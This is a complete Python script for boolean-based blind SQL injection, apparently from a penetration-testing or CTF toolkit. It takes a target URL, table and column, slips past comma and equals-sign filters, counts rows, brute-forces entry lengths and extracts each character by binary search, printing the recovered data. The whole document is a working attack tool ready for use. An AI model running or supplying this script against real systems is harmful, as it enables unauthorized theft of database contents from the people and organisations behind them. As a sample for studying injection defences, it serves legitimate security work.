#!/usr/bin/env python3

import requests
import sys

def usage():
    print(f"""
Usage: {sys.argv[0]} <url> <table> <column>

This script uses boolean-based SQL injection to extract data from a SQLi-vulnerable URL while bypassing character
filters (such as commas and equal signs).

Arguments:
  url    - The root URL where the sql injections takes place. Starts with http:// and ends in /
  table  - Name of the table to be exploited. If unkown, consider using the database enumeration table in this folder
  column - Name of the column to be exploited. If unkown, consider using the database enumeration table in this folder
""")
    sys.exit(1)

# Get numbers of rows in column
def rowCount(table, max=64):
    # Test if our boolean works (i.e., we can tell true from false)
    matched_payload = f"a' OR (SELECT COUNT(1) FROM {table}) NOT LIKE 0-- -/"
    matched_payload = replace_spaces(matched_payload)
    matched = requests.get(url + matched_payload)

    unmatched_payload = f"a' OR (SELECT COUNT(1) FROM {table}) LIKE 0-- -/"
    unmatched_payload = replace_spaces(unmatched_payload)
    unmatched = requests.get(url + unmatched_payload)

    if matched.text == unmatched.text:
        raise Exception(f"Cannot identify number of columns in {table}.\nMatched: {matched.text}\nUnmatched: {unmatched.text}")

    # Brute force number until we get a match for number of entries in the table
    for i in range(0, max):
        loop_payload = f"a' OR (SELECT COUNT(1) FROM {table}) LIKE {i}-- -/"
        loop_payload = replace_spaces(loop_payload)
        r = requests.get(url + loop_payload)
        if r.text != unmatched.text:
            return i

    raise Exception(f"Cannot identify number of columns in {table}")

# Get lenght of each row
def columnLength(table, column, line, max=64):
    # Test if our boolean works (i.e., we can tell true from false)
    matched_payload = f"a' OR (SELECT LENGTH({column}) FROM {table} LIMIT 1 OFFSET {line}) NOT LIKE 0-- -/"
    matched_payload = replace_spaces(matched_payload)
    matched = requests.get(url + matched_payload)

    unmatched_payload = f"a' OR (SELECT LENGTH({column}) FROM {table} LIMIT 1 OFFSET {line}) LIKE 0-- -/"
    unmatched_payload = replace_spaces(unmatched_payload)
    unmatched = requests.get(url + unmatched_payload)

    if matched.text == unmatched.text:
        raise Exception(f"Cannot get column length for column {column}.")

    # Brute force number until we get a match for length of data in row {offset}
    for i in range(0, max):
        loop_payload = f"a' OR (SELECT LENGTH({column}) FROM {table} LIMIT 1 OFFSET {line}) LIKE {i}-- -/"
        loop_payload = replace_spaces(loop_payload)
        r = requests.get(url + loop_payload)
        if r.text != unmatched.text:
            return i

    raise Exception(f"Cannot identify number of columns in {table}")

# Use binary search to find one character at a time
def getChar(table, column, offset, line):
    # Smallest ascii character (' ')
    start = 32
    # Largest ascii character ('~')
    end = 126

    # Test if our boolean works (i.e., we can tell true from false)
    matched_payload = f"a' OR (SELECT SUBSTR({column} FROM 0 FOR 0) FROM {table} LIMIT 1 OFFSET {line}) NOT LIKE 0-- -/"
    matched_payload = replace_spaces(matched_payload)
    matched = requests.get(url + matched_payload)

    unmatched_payload = f"a' OR (SELECT SUBSTR({column} FROM 0 FOR 0) FROM {table} LIMIT 1 OFFSET {line}) LIKE 0-- -/"
    unmatched_payload = replace_spaces(unmatched_payload)
    unmatched = requests.get(url + unmatched_payload)

    if matched.text == unmatched.text:
        raise Exception(f"Cannot execute substr.\nMatched: {matched.text}\nUnmatched: {unmatched.text}")

    while start != (end - 1):
        halfway = int((end - start) / 2)
        guess = start + halfway
        payload = f"a' OR (SELECT ORD(SUBSTR({column} FROM {offset} FOR 1)) FROM {table} LIMIT 1 OFFSET {line}) BETWEEN {start} AND {guess}-- -/"
        payload = replace_spaces(payload)
        r = requests.get(url + payload)
        if r.text == matched.text:
            end = guess
        else:
            start = guess
    
    # The loop above leaves us with two options, we'll test both and return message if neither
    payload = f"a' OR (SELECT ORD(SUBSTR({column} FROM {offset} FOR 1)) FROM {table} LIMIT 1 OFFSET {line}) LIKE {start}-- -/"
    payload = replace_spaces(payload)
    r = requests.get(url + payload)
    if r.text == matched.text:
        return chr(start)

    payload = f"a' OR (SELECT ORD(SUBSTR({column} FROM {offset} FOR 1)) FROM {table} LIMIT 1 OFFSET {line}) LIKE {end}-- -/"
    payload = replace_spaces(payload)
    r = requests.get(url + payload)
    if r.text == matched.text:
        return chr(end)
    
    raise Exception(f"Could not find character {offset} in line {line}")


def replace_spaces(command: str) -> str:
    return command.replace(" ", "%20")


if __name__ == "__main__":
    if len(sys.argv) < 4:
        usage()
        exit
    else:
        url = sys.argv[1]
        table = sys.argv[2]
        column = sys.argv[3]

    rowCount = rowCount(table)

    for row in range(0, rowCount):
        entry_length = columnLength(table, column, row)
        for char in range(1, entry_length + 1):
            print(getChar(table, column, char, row), end="", flush=True)
        print()